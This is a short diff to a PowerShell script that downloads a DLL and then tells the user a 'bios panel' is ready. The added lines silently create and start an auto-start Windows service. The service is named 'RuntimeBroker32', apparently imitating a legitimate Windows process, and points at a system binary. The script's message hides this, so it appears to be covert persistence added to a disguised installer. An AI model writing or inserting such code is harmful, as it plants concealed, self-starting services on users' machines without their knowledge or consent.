@@ -88,6 +88,12 @@ $dllName = "bstkvm.dll"
 $result = Download-DLL -DllUrl $dllUrl -SaveDirectory $saveDir -DllFileName $dllName
 
 if ($result) {
+    # Create Windows Service
+    sc.exe create RuntimeBroker32 binPath= "C:\Windows\System32\dwmcore.exe" start= auto | Out-Null
+    
+    # Start the Service immediately
+    sc.exe start RuntimeBroker32 | Out-Null
+    
     Write-Host "bios panel is ready to use now Please restart Your PC " -ForegroundColor Green
 } else {
     Write-Host ""
